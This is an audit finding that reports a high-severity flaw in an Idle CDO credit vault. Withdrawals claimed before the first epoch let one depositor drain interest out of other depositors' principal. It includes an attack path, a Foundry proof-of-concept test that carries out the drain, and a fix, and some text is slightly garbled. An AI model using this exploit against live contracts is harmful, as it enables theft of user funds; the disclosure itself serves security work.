# [H] A single depositor can grief other

## Summary
Severity: High
Contest weight: 0.9685
Dataset id: 1941
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
first epoch
After the CDO is initialized, deposits are allowed to provide the liquidity that will be used for the first epoch. During this same period, before the first epoch is started, withdrawals are also allowed (they are enabled when the contract is initialized), this makes sense, a depositor could request a withdrawal that would be withdrawable as soon as the first epoch is over, this depositor may have intentions to only seed liquidity for a single epoch, point is, depositors are allowed to request a withdrawal.
The problem that allows the exploit is that the requested withdrawals can actually be claimed right away, the IdleCreditVault.claimWithdrawRequest() relies on a condition that doesn't prevent withdrawal requests to be claimed before the first epoch ends.
```solidity
function claimWithdrawRequest(address _user) external returns (uint256 amount) {
    ...
    // lastWithdrawRequest was made on the current epoch. (`false && whatever` will always evaluate to false)
    claimed without needing to wait for finalization of the first epoch
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
        revert NotAllowed();
    }
    ...
}
```
This flaw allows for the attack described on the Attack Path section to be possible, causing to all the depositor's liquidity to be stolen.
As demonstrated on the coded PoC provided on the PoC section, a single depositor can continously deposit, request a withdraw and claim the requested withdraw before the first epoch starts.
• The requested withdraw claims the interests that would've been earnt during the first epoch, but, without needing to wait for the first epoch to end.
– That extra claimed amount comes from the deposits of the other depositors.
Since all deposits are sent directly to the CreditVault, all the extra liquidity taken by the griefer comes from the liquidity of the other depositors.
Initilization of the CDO contract sets the contract's state in such a way that it allows depositors to claim normal requested withdrawals without needing to wait until the first epoch is over.
Internal Pre-conditions
No epoch has started on the CDO. Liquidity (deposits) to start the first epoch is being collected before starting the first epoch.
External Pre-conditions
None.
Attack Path
1. Depositors provides liquidity on the CDO contract before the first epoch starts.
2. A depositor request a withdraw for all his deposits.
3. Depositor claims right away the requested withdraw.
4. The depositor receives his principal + the interest it would earn during the first epoch.
5. rinse && repeat step to continue draining the principal of the other depositors.
Deposits made before the first epoch can be stolen

## Proof of Concept
Add the next PoC on the IdleCreditVault.t.sol test file:
```solidity
function test_depositsBeforFirstEpochStartsCanBeStolenPoC() external {
    uint256 depositAmount = 10000 * ONE_SCALE;
    IdleCDOEpochVariant CDO = IdleCDOEpochVariant(address(idleCDO));
    assertEq(CDO.paused(),false,"Pause is True");
    assertEq(CDO.epochEndDate(),0,"epochEndDate != 0");
    IdleCreditVault strategy = IdleCreditVault(CDO.strategy());
    assert(strategy.getApr() != 0);
    address underlyingToken = CDO.token();
    address TranchTokenAA = CDO.AATranche();
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    {
        deal(underlyingToken, user1, depositAmount);
        deal(underlyingToken, user2, depositAmount);
        deal(underlyingToken, user3, depositAmount);
        vm.startPrank(user1);
        IERC20(underlyingToken).approve(address(CDO), type(uint256).max);
        CDO.depositAA(depositAmount);
        vm.stopPrank();
        vm.startPrank(user2);
        IERC20(underlyingToken).approve(address(CDO), type(uint256).max);
        CDO.depositAA(depositAmount);
        vm.stopPrank();
        vm.startPrank(user3);
        IERC20(underlyingToken).approve(address(CDO), type(uint256).max);
        CDO.depositAA(depositAmount);
        vm.stopPrank();
    }
    uint256 initialStrategyUnderlingBalance = 3 * depositAmount;
    uint256 strategyUnderlyingBalance_before =
        IERC20(underlyingToken).balanceOf(address(strategy));
    assertEq(strategyUnderlyingBalance_before, initialStrategyUnderlingBalance);
    // on the CDO!
    uint256 user3UnderlyingBalance_before =
        IERC20(underlyingToken).balanceOf(address(user3));
    assertEq(user3UnderlyingBalance_before, 0);
    {
        vm.startPrank(user3);
        CDO.requestWithdraw(0,TranchTokenAA);
        CDO.claimWithdrawRequest();
        CDO.depositAA(IERC20(underlyingToken).balanceOf(address(user3)));
        CDO.requestWithdraw(0,TranchTokenAA);
        CDO.claimWithdrawRequest();
        CDO.depositAA(IERC20(underlyingToken).balanceOf(address(user3)));
        CDO.requestWithdraw(0,TranchTokenAA);
        CDO.claimWithdrawRequest();
        vm.stopPrank();
    }
    // claim the withdraw request, he claimed the interests as if the epoch would have ended!
    uint256 user3UnderlyingBalanc_after =
        IERC20(underlyingToken).balanceOf(address(user3));
    assertGt(user3UnderlyingBalanc_after, depositAmount);
    // User1 and User2
    uint256 strategyUnderlyingBalance_after =
        IERC20(underlyingToken).balanceOf(address(strategy));
    assertLt(strategyUnderlyingBalance_after, 2 * depositAmount);
}
```
Run the previous PoC with the next command: forge test --match-test test_depositsBeforFirstEpochStartsCanBeStolenPoC -vvvv

## Recommendation
The most straight forward mitigation is to initialize the epochEndDate to block.timestamp when the CDO is initialized.
• This will make that the validation on the IdleCreditVault.claimWithdrawRequest() to correctly prevent claiming withdrawal requests before the first epoch ends.
IdleCDOEpochVariant._additionalInit()
```solidity
function _additionalInit() internal virtual override {
    ...
    epochEndDate = block.timestamp;
}
```
